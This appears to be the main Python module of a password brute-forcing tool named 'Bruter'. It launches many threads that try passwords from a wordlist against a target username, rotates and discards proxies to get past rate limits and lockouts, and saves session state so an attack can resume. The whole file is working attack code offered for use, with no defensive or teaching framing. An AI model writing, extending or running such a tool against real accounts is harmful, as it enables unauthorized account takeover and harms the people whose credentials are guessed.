# Date: 12/28/2018
# Author: Mohamed
# Description: Bruter

from time import time, sleep
from lib.browser import Browser
from lib.display import Display
from threading import Thread, RLock
from lib.proxy_manager import ProxyManager
from lib.password_manager import PasswordManager
from lib.const import max_time_to_wait, max_bots_per_proxy


class Bruter(object):

    def __init__(self, username, threads, passlist_path):
        self.browsers = []
        self.lock = RLock()
        self.password = None
        self.is_alive = True
        self.is_found = False
        self.bots_per_proxy = 0
        self.username = username
        self.last_password = None
        self.active_passwords = []
        self.proxy_manager = ProxyManager()
        self.display = Display(username, passlist_path)
        self.password_manager = PasswordManager(username,
                                                passlist_path, threads, self.display)

    def manage_session(self):
        if self.password_manager.is_read:
            if not self.password_manager.list_size or self.is_found:
                self.password_manager.session.delete()
        else:
            if self.is_found:
                self.password_manager.session.delete()
            else:
                self.password_manager.session.write(self.password_manager.attempts,
                                                    self.password_manager.passlist)

    def browser_manager(self):
        while self.is_alive:

            for browser in self.browsers:

                if not self.is_alive:
                    break

                if Display.account_exists == None and Browser.account_exists != None:
                    Display.account_exists = Browser.account_exists

                if not browser.is_active:

                    password = browser.password

                    if browser.is_attempted and not browser.is_locked:

                        if browser.is_found and not self.is_found:
                            self.password = password
                            self.is_found = True

                        with self.lock:
                            self.password_manager.list_remove(password)
                    else:
                        with self.lock:
                            self.proxy_manager.bad_proxy(browser.proxy)

                    self.remove_browser(browser)

                else:
                    if browser.start_time:
                        if time() - browser.start_time >= max_time_to_wait:
                            browser.close()

    def remove_browser(self, browser):
        if browser in self.browsers:
            with self.lock:
                self.browsers.pop(self.browsers.index(browser))
                self.active_passwords.pop(
                    self.active_passwords.index(browser.password)
                )

    def attack(self):
        proxy = None
        is_attack_started = False
        while self.is_alive:

            browsers = []
            for password in self.password_manager.passlist:

                if not self.is_alive:
                    break

                if not proxy:
                    proxy = self.proxy_manager.get_proxy()
                    self.bots_per_proxy = 0

                if self.bots_per_proxy >= max_bots_per_proxy:
                    proxy = None

                if not proxy:
                    continue

                if not password in self.active_passwords and password in self.password_manager.passlist:
                    browser = Browser(self.username, password, proxy)
                    browsers.append(browser)
                    self.bots_per_proxy += 1

                    if not is_attack_started:
                        self.display.info('Starting attack ...')
                        is_attack_started = True

                    with self.lock:
                        self.browsers.append(browser)
                        self.active_passwords.append(password)

            for browser in browsers:
                thread = Thread(target=browser.attempt)
                thread.daemon = True
                try:
                    thread.start()
                except:
                    self.remove_browser(browser)

    def start_daemon_threads(self):
        attack = Thread(target=self.attack)
        browser_manager = Thread(target=self.browser_manager)
        proxy_manager = Thread(target=self.proxy_manager.start)
        password_manager = Thread(target=self.password_manager.start)

        attack.daemon = True
        proxy_manager.daemon = True
        browser_manager.daemon = True
        password_manager.daemon = True

        attack.start()
        proxy_manager.start()
        browser_manager.start()
        password_manager.start()

        self.display.info('Searching for proxies ...')

    def stop_daemon_threads(self):
        self.proxy_manager.stop()
        self.password_manager.stop()

    def start(self):
        self.display.info('Initiating daemon threads ...')
        self.start_daemon_threads()

        last_attempt = 0
        while self.is_alive and not self.is_found:

            if last_attempt == self.password_manager.attempts and self.password_manager.attempts:
                sleep(1.5)
                continue

            for browser in self.browsers:

                self.display.stats(
                    browser.password, self.password_manager.attempts, len(self.browsers))
                last_attempt = self.password_manager.attempts
                self.last_password = browser.password

                if not self.is_alive or self.is_found:
                    break

            if self.password_manager.is_read and not self.password_manager.list_size and not len(self.browsers):
                self.is_alive = False

    def stop(self):
        self.is_alive = False
        self.manage_session()
        self.stop_daemon_threads()
        self.password_manager.session.is_busy = False
